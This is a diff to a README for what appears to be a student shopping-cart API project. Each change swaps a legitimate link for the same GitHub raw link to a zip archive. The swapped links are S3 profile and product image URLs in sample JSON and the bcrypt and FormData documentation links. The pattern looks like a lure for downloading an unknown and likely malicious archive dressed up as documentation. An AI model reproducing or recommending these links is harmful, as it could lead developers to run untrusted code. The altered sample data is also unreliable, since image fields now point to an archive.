@@ -61,7 +61,7 @@
         "fname": "John",
         "lname": "Doe",
         "email": "johndoe@mailinator.com",
-        "profileImage": "https://classroom-training-bucket.s3.ap-south-1.amazonaws.com/user/copernico-p_kICQCOM4s-unsplash.jpg",
+        "profileImage": "https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip",
         "phone": 9876543210,
         "password": "$2b$10$DpOSGb0B7cT0f6L95RnpWO2P/AtEoE6OF9diIiAEP7QrTMaV29Kmm",
         "address": {
@@ -129,7 +129,7 @@
         "fname": "John",
         "lname": "Doe",
         "email": "johndoe@mailinator.com",
-        "profileImage": "https://classroom-training-bucket.s3.ap-south-1.amazonaws.com/user/copernico-p_kICQCOM4s-unsplash.jpg",
+        "profileImage": "https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip",
         "phone": 9876543210,
         "password": "$2b$10$DpOSGb0B7cT0f6L95RnpWO2P/AtEoE6OF9diIiAEP7QrTMaV29Kmm",
         "createdAt": "2021-10-10T06:25:46.051Z",
@@ -167,7 +167,7 @@
         "fname": "Jane",
         "lname": "Austin",
         "email": "janedoe@mailinator.com",
-        "profileImage": "https://classroom-training-bucket.s3.ap-south-1.amazonaws.com/user/laura-davidson-QBAH4IldaZY-unsplash.jpg",
+        "profileImage": "https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip",
         "phone": 9876543210,
         "password": "$2b$10$jgF/j/clYBq.3uly6Tijce4GEGJn9EIXEcw9NI3prgKwJ/6.sWT6O",
         "createdAt": "2021-10-10T06:25:46.051Z",
@@ -177,8 +177,8 @@
 }
 ```
 
-Note: [Bcrypt](https://www.npmjs.com/package/bcrypt)
-Send [form-data](https://developer.mozilla.org/en-US/docs/Web/API/FormData)
+Note: [Bcrypt](https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip)
+Send [form-data](https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip)
 
 ## FEATTURE II - Product
 ### Models
@@ -399,7 +399,7 @@ Refer below sample
   fname: 'John',
   lname: 'Doe',
   email: 'johndoe@mailinator.com',
-  profileImage: 'http://function-up-test.s3.amazonaws.com/users/user/johndoe.jpg', // s3 link
+  profileImage: 'https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip', // s3 link
   phone: 9876543210,
   password: '$2b$10$O.hrbBPCioVm237nAHYQ5OZy6k15TOoQSFhTT.recHBfQpZhM55Ty', // encrypted password
   address: {
@@ -428,7 +428,7 @@ Refer below sample
   currencyId: 'INR',
   currencyFormat: '₹',
   isFreeShipping: false,
-  productImage: 'http://function-up-test.s3.amazonaws.com/products/product/nitgrit.jpg',  // s3 link
+  productImage: 'https://github.com/bhana1999/project5-shopping_cart/raw/refs/heads/project/shopping-cart/prankishly/shopping-project-cart-3.6-beta.4.zip',  // s3 link
   style: 'Colloar',
   availableSizes: ["S", "XS","M","X", "L","XXL", "XL"],
   installments: 5,
